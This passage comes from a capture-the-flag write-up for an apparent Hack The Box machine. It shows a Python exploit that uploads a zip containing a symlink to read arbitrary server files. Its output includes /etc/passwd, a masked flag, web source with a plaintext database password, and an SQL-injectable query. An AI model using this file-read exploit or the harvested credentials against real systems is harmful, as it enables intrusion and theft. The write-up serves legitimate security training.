    <span class="n">fileUrl</span> <span class="o">=</span> <span class="n">mainUrl</span> <span class="o">+</span> <span class="n">fileUrl</span>
    <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">fileUrl</span><span class="p">)</span>

    <span class="nb">print</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>





<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>

    <span class="n">fileToRead</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
    <span class="n">create_zip_with_symlink</span><span class="p">(</span><span class="s1">'malicious.zip'</span><span class="p">,</span> <span class="s1">'malicious.pdf'</span><span class="p">,</span> <span class="n">fileToRead</span><span class="p">)</span>
    <span class="n">readFile</span><span class="p">()</span>


<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">'__main__'</span><span class="p">:</span>

    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">"</span><span class="se">\n\n</span><span class="s2">[!] Usage: python </span><span class="si">%s</span><span class="s2"> &lt;file&gt;"</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="n">main</span><span class="p">()</span>
    <span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">"</span><span class="se">\n\n</span><span class="s2">[!] Leaving..."</span><span class="p">)</span>
        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</pre></div>

I didn't know how to use symlinks in zip files using Python, so I borrowed some code from this <a href="https://stackoverflow.com/questions/35782941/archiving-symlinks-with-python-zipfile">discussion on Stack Overflow</a>.<br/><br/>
Let's see if it works:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span>
<span class="n">root</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
<span class="n">daemon</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="n">daemon</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="nb">bin</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">2</span><span class="p">:</span><span class="mi">2</span><span class="p">:</span><span class="nb">bin</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">sys</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">3</span><span class="p">:</span><span class="mi">3</span><span class="p">:</span><span class="n">sys</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">sync</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">4</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="n">sync</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sync</span>
<span class="n">games</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">5</span><span class="p">:</span><span class="mi">60</span><span class="p">:</span><span class="n">games</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">games</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">man</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">6</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">man</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">cache</span><span class="o">/</span><span class="n">man</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">lp</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">7</span><span class="p">:</span><span class="mi">7</span><span class="p">:</span><span class="n">lp</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">lpd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">mail</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">8</span><span class="p">:</span><span class="mi">8</span><span class="p">:</span><span class="n">mail</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">mail</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">news</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">9</span><span class="p">:</span><span class="mi">9</span><span class="p">:</span><span class="n">news</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">news</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">uucp</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="n">uucp</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">uucp</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">proxy</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="n">proxy</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">backup</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="n">backup</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">backups</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="nb">list</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="n">Mailing</span> <span class="n">List</span> <span class="n">Manager</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="nb">list</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">irc</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="n">ircd</span><span class="p">:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">ircd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">nobody</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="n">nobody</span><span class="p">:</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">_apt</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">100</span><span class="p">:</span><span class="mi">65534</span><span class="p">::</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">systemd</span><span class="o">-</span><span class="n">network</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">101</span><span class="p">:</span><span class="mi">102</span><span class="p">:</span><span class="n">systemd</span> <span class="n">Network</span> <span class="n">Management</span><span class="p">,,,:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">systemd</span><span class="o">-</span><span class="n">timesync</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">102</span><span class="p">:</span><span class="mi">103</span><span class="p">:</span><span class="n">systemd</span> <span class="n">Time</span> <span class="n">Synchronization</span><span class="p">,,,:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">messagebus</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">103</span><span class="p">:</span><span class="mi">109</span><span class="p">::</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">systemd</span><span class="o">-</span><span class="n">resolve</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">104</span><span class="p">:</span><span class="mi">110</span><span class="p">:</span><span class="n">systemd</span> <span class="n">Resolver</span><span class="p">,,,:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">pollinate</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">105</span><span class="p">:</span><span class="mi">1</span><span class="p">::</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">cache</span><span class="o">/</span><span class="n">pollinate</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">false</span>
<span class="n">sshd</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">106</span><span class="p">:</span><span class="mi">65534</span><span class="p">::</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">sshd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">rektsu</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1001</span><span class="p">:</span><span class="mi">1001</span><span class="p">::</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">rektsu</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
<span class="n">mysql</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">107</span><span class="p">:</span><span class="mi">115</span><span class="p">:</span><span class="n">MySQL</span> <span class="n">Server</span><span class="p">,,,:</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">false</span>
<span class="n">_laurel</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">999</span><span class="p">:</span><span class="mi">999</span><span class="p">::</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">laurel</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">false</span>
</pre></div>

It works correctly, so now we can enumerate the filesystem. Looking at the <code>/etc/passwd</code> file, we noticed that there are two users:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">sh</span><span class="err">$</span>
<span class="n">root</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
<span class="n">rektsu</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1001</span><span class="p">:</span><span class="mi">1001</span><span class="p">::</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">rektsu</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
</pre></div>

We can read <code>user.txt</code>:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">rektsu</span><span class="o">/</span><span class="n">user</span><span class="o">.</span><span class="n">txt</span>
<span class="mi">18</span><span class="n">a6f</span><span class="o">**********************</span><span class="mi">358</span><span class="n">ce</span>
</pre></div>

I found the directory where the website is hosted by testing some of the most common ones:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">php</span>
<span class="o">&lt;</span><span class="err">!</span><span class="n">DOCTYPE</span> <span class="n">html</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="n">html</span> <span class="n">lang</span><span class="o">=</span><span class="s2">"en"</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="n">head</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="n">meta</span> <span class="n">charset</span><span class="o">=</span><span class="s2">"utf-8"</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="n">meta</span> <span class="n">name</span><span class="o">=</span><span class="s2">"viewport"</span> <span class="n">content</span><span class="o">=</span><span class="s2">"width=device-width, initial-scale=1, shrink-to-fit=no"</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="n">meta</span> <span class="n">name</span><span class="o">=</span><span class="s2">"description"</span> <span class="n">content</span><span class="o">=</span><span class="s2">"Start your development with Creative Design landing page."</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="n">meta</span> <span class="n">name</span><span class="o">=</span><span class="s2">"author"</span> <span class="n">content</span><span class="o">=</span><span class="s2">"Devcrud"</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="n">title</span><span class="o">&gt;</span><span class="n">Zipping</span> <span class="o">|</span> <span class="n">Watch</span> <span class="n">store</span><span class="o">&lt;/</span><span class="n">title</span><span class="o">&gt;</span>
<span class="o">........................</span>
<span class="o">........................</span>
<span class="o">........................</span>
<span class="o">........................</span>
<span class="o">........................</span>
        <span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;&amp;</span><span class="n">copy</span><span class="p">;</span> <span class="n">Zipping</span> <span class="n">Watch</span> <span class="n">Store</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>            
            <span class="o">&lt;/</span><span class="n">footer</span><span class="o">&gt;&lt;</span><span class="err">!</span><span class="o">--</span> <span class="n">End</span> <span class="n">of</span> <span class="n">Footer</span><span class="o">--&gt;</span>  

        <span class="o">&lt;/</span><span class="n">div</span><span class="o">&gt;&lt;</span><span class="err">!</span><span class="o">--</span><span class="n">End</span> <span class="n">of</span> <span class="n">Container</span> <span class="o">--&gt;</span>      
    <span class="o">&lt;/</span><span class="n">section</span><span class="o">&gt;&lt;</span><span class="err">!</span><span class="o">--</span> <span class="n">End</span> <span class="n">of</span> <span class="n">Section</span> <span class="o">--&gt;</span>

    <span class="o">&lt;</span><span class="err">!</span><span class="o">--</span> <span class="n">core</span>  <span class="o">--&gt;</span>
    <span class="o">&lt;</span><span class="n">script</span> <span class="n">src</span><span class="o">=</span><span class="s2">"assets/vendors/jquery/jquery-3.4.1.js"</span><span class="o">&gt;&lt;/</span><span class="n">script</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="n">script</span> <span class="n">src</span><span class="o">=</span><span class="s2">"assets/vendors/bootstrap/bootstrap.bundle.js"</span><span class="o">&gt;&lt;/</span><span class="n">script</span><span class="o">&gt;</span>

    <span class="o">&lt;</span><span class="err">!</span><span class="o">--</span> <span class="n">bootstrap</span> <span class="n">affix</span> <span class="o">--&gt;</span>
    <span class="o">&lt;</span><span class="n">script</span> <span class="n">src</span><span class="o">=</span><span class="s2">"assets/vendors/bootstrap/bootstrap.affix.js"</span><span class="o">&gt;&lt;/</span><span class="n">script</span><span class="o">&gt;</span>

    <span class="o">&lt;</span><span class="err">!</span><span class="o">--</span> <span class="n">Creative</span> <span class="n">Design</span> <span class="n">js</span> <span class="o">--&gt;</span>
    <span class="o">&lt;</span><span class="n">script</span> <span class="n">src</span><span class="o">=</span><span class="s2">"assets/js/creative-design.js"</span><span class="o">&gt;&lt;/</span><span class="n">script</span><span class="o">&gt;</span>

<span class="o">&lt;/</span><span class="n">body</span><span class="o">&gt;</span>
<span class="o">&lt;/</span><span class="n">html</span><span class="o">&gt;</span>
</pre></div>

When inspecting the file <code>/var/www/html/shop/index.php</code>, we observe that each file loaded in the GET parameter <code>page</code> would be included by concatenating the extension <code>.php</code> to the end of the file name:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">shop</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">php</span>
<span class="o">&lt;</span><span class="err">?</span><span class="n">php</span>
<span class="n">session_start</span><span class="p">();</span>
<span class="o">//</span> <span class="n">Include</span> <span class="n">functions</span> <span class="ow">and</span> <span class="n">connect</span> <span class="n">to</span> <span class="n">the</span> <span class="n">database</span> <span class="n">using</span> <span class="n">PDO</span> <span class="n">MySQL</span>
<span class="n">include</span> <span class="s1">'functions.php'</span><span class="p">;</span>
<span class="err">$</span><span class="n">pdo</span> <span class="o">=</span> <span class="n">pdo_connect_mysql</span><span class="p">();</span>
<span class="o">//</span> <span class="n">Page</span> <span class="ow">is</span> <span class="nb">set</span> <span class="n">to</span> <span class="n">home</span> <span class="p">(</span><span class="n">home</span><span class="o">.</span><span class="n">php</span><span class="p">)</span> <span class="n">by</span> <span class="n">default</span><span class="p">,</span> <span class="n">so</span> <span class="n">when</span> <span class="n">the</span> <span class="n">visitor</span> <span class="n">visits</span><span class="p">,</span> <span class="n">that</span> <span class="n">will</span> <span class="n">be</span> <span class="n">the</span> <span class="n">page</span> <span class="n">they</span> <span class="n">see</span><span class="o">.</span>
<span class="err">$</span><span class="n">page</span> <span class="o">=</span> <span class="n">isset</span><span class="p">(</span><span class="err">$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">'page'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="n">file_exists</span><span class="p">(</span><span class="err">$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">'page'</span><span class="p">]</span> <span class="o">.</span> <span class="s1">'.php'</span><span class="p">)</span> <span class="err">?</span> <span class="err">$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">'page'</span><span class="p">]</span> <span class="p">:</span> <span class="s1">'home'</span><span class="p">;</span>
<span class="o">//</span> <span class="n">Include</span> <span class="ow">and</span> <span class="n">show</span> <span class="n">the</span> <span class="n">requested</span> <span class="n">page</span>
<span class="n">include</span> <span class="err">$</span><span class="n">page</span> <span class="o">.</span> <span class="s1">'.php'</span><span class="p">;</span>
<span class="err">?</span><span class="o">&gt;</span>
</pre></div>

This file is also including the <code>functions.php</code> file. As it is attempting to connect to a database, it could contain credentials.<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">shop</span><span class="o">/</span><span class="n">functions</span><span class="o">.</span><span class="n">php</span>
<span class="o">&lt;</span><span class="err">?</span><span class="n">php</span>
<span class="n">function</span> <span class="n">pdo_connect_mysql</span><span class="p">()</span> <span class="p">{</span>
    <span class="o">//</span> <span class="n">Update</span> <span class="n">the</span> <span class="n">details</span> <span class="n">below</span> <span class="k">with</span> <span class="n">your</span> <span class="n">MySQL</span> <span class="n">details</span>
    <span class="err">$</span><span class="n">DATABASE_HOST</span> <span class="o">=</span> <span class="s1">'localhost'</span><span class="p">;</span>
    <span class="err">$</span><span class="n">DATABASE_USER</span> <span class="o">=</span> <span class="s1">'root'</span><span class="p">;</span>
    <span class="err">$</span><span class="n">DATABASE_PASS</span> <span class="o">=</span> <span class="s1">'MySQL_P@ssw0rd!'</span><span class="p">;</span>
    <span class="err">$</span><span class="n">DATABASE_NAME</span> <span class="o">=</span> <span class="s1">'zipping'</span><span class="p">;</span>
    <span class="k">try</span> <span class="p">{</span>
        <span class="k">return</span> <span class="n">new</span> <span class="n">PDO</span><span class="p">(</span><span class="s1">'mysql:host='</span> <span class="o">.</span> <span class="err">$</span><span class="n">DATABASE_HOST</span> <span class="o">.</span> <span class="s1">';dbname='</span> <span class="o">.</span> <span class="err">$</span><span class="n">DATABASE_NAME</span> <span class="o">.</span> <span class="s1">';charset=utf8'</span><span class="p">,</span> <span class="err">$</span><span class="n">DATABASE_USER</span><span class="p">,</span> <span class="err">$</span><span class="n">DATABASE_PASS</span><span class="p">);</span>
    <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">PDOException</span> <span class="err">$</span><span class="n">exception</span><span class="p">)</span> <span class="p">{</span>
        <span class="o">//</span> <span class="n">If</span> <span class="n">there</span> <span class="ow">is</span> <span class="n">an</span> <span class="n">error</span> <span class="k">with</span> <span class="n">the</span> <span class="n">connection</span><span class="p">,</span> <span class="n">stop</span> <span class="n">the</span> <span class="n">script</span> <span class="ow">and</span> <span class="n">display</span> <span class="n">the</span> <span class="n">error</span><span class="o">.</span>
        <span class="n">exit</span><span class="p">(</span><span class="s1">'Failed to connect to database!'</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="o">//</span> <span class="n">Template</span> <span class="n">header</span><span class="p">,</span> <span class="n">feel</span> <span class="n">free</span> <span class="n">to</span> <span class="n">customize</span> <span class="n">this</span>
<span class="n">function</span> <span class="n">template_header</span><span class="p">(</span><span class="err">$</span><span class="n">title</span><span class="p">)</span> <span class="p">{</span>
<span class="err">$</span><span class="n">num_items_in_cart</span> <span class="o">=</span> <span class="n">isset</span><span class="p">(</span><span class="err">$</span><span class="n">_SESSION</span><span class="p">[</span><span class="s1">'cart'</span><span class="p">])</span> <span class="err">?</span> <span class="n">count</span><span class="p">(</span><span class="err">$</span><span class="n">_SESSION</span><span class="p">[</span><span class="s1">'cart'</span><span class="p">])</span> <span class="p">:</span> <span class="mi">0</span><span class="p">;</span>
<span class="n">echo</span> <span class="o">&lt;&lt;&lt;</span><span class="n">EOT</span>
<span class="o">&lt;</span><span class="err">!</span><span class="n">DOCTYPE</span> <span class="n">html</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="n">html</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="n">head</span><span class="o">&gt;</span>
        <span class="o">&lt;</span><span class="n">meta</span> <span class="n">charset</span><span class="o">=</span><span class="s2">"utf-8"</span><span class="o">&gt;</span>
<span class="o">...............</span>
<span class="o">...............</span>
<span class="o">...............</span>
<span class="o">...............</span>
<span class="o">...............</span>
<span class="n">EOT</span><span class="p">;</span>
<span class="p">}</span>
<span class="o">//</span> <span class="n">Template</span> <span class="n">footer</span>
<span class="n">function</span> <span class="n">template_footer</span><span class="p">()</span> <span class="p">{</span>
<span class="err">$</span><span class="n">year</span> <span class="o">=</span> <span class="n">date</span><span class="p">(</span><span class="s1">'Y'</span><span class="p">);</span>
<span class="n">echo</span> <span class="o">&lt;&lt;&lt;</span><span class="n">EOT</span>
        <span class="o">&lt;/</span><span class="n">main</span><span class="o">&gt;</span>
        <span class="o">&lt;</span><span class="n">footer</span><span class="o">&gt;</span>
            <span class="o">&lt;</span><span class="n">div</span> <span class="n">class</span><span class="o">=</span><span class="s2">"content-wrapper"</span><span class="o">&gt;</span>
                <span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;&amp;</span><span class="n">copy</span><span class="p">;</span> <span class="err">$</span><span class="n">year</span><span class="p">,</span> <span class="n">Zipping</span> <span class="n">Watch</span> <span class="n">Store</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
            <span class="o">&lt;/</span><span class="n">div</span><span class="o">&gt;</span>
        <span class="o">&lt;/</span><span class="n">footer</span><span class="o">&gt;</span>
    <span class="o">&lt;/</span><span class="n">body</span><span class="o">&gt;</span>
<span class="o">&lt;/</span><span class="n">html</span><span class="o">&gt;</span>
<span class="n">EOT</span><span class="p">;</span>
<span class="p">}</span>
<span class="err">?</span><span class="o">&gt;</span>
</pre></div>

It contains the credentials of the root user to connect to the database. I tried the password to access as the <code>rektsu</code> user through SSH, but it didn't work.<br/><br/>
Remembering what we saw during the website inspection, we encountered the file <code>product.php</code>. It could be interesting to read its content:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">shop</span><span class="o">/</span><span class="n">product</span><span class="o">.</span><span class="n">php</span>
<span class="o">&lt;</span><span class="err">?</span><span class="n">php</span>
<span class="o">//</span> <span class="n">Check</span> <span class="n">to</span> <span class="n">make</span> <span class="n">sure</span> <span class="n">the</span> <span class="nb">id</span> <span class="n">parameter</span> <span class="ow">is</span> <span class="n">specified</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">URL</span>
<span class="k">if</span> <span class="p">(</span><span class="n">isset</span><span class="p">(</span><span class="err">$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="err">$</span><span class="nb">id</span> <span class="o">=</span> <span class="err">$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">];</span>
    <span class="o">//</span> <span class="n">Filtering</span> <span class="n">user</span> <span class="nb">input</span> <span class="k">for</span> <span class="n">letters</span> <span class="ow">or</span> <span class="n">special</span> <span class="n">characters</span>
    <span class="k">if</span><span class="p">(</span><span class="n">preg_match</span><span class="p">(</span><span class="s2">"/^.*[A-Za-z!#$%^&amp;*()\-_=+</span><span class="si">{}</span><span class="s2">\[\]</span><span class="se">\\</span><span class="s2">|;:'</span><span class="se">\"</span><span class="s2">,.&lt;&gt;\/?]|[^0-9]$/"</span><span class="p">,</span> <span class="err">$</span><span class="nb">id</span><span class="p">,</span> <span class="err">$</span><span class="n">match</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">header</span><span class="p">(</span><span class="s1">'Location: index.php'</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="o">//</span> <span class="n">Prepare</span> <span class="n">statement</span> <span class="ow">and</span> <span class="n">execute</span><span class="p">,</span> <span class="n">but</span> <span class="n">does</span> <span class="ow">not</span> <span class="n">prevent</span> <span class="n">SQL</span> <span class="n">injection</span>
        <span class="err">$</span><span class="n">stmt</span> <span class="o">=</span> <span class="err">$</span><span class="n">pdo</span><span class="o">-&gt;</span><span class="n">prepare</span><span class="p">(</span><span class="s2">"SELECT * FROM products WHERE id = '$id'"</span><span class="p">);</span>
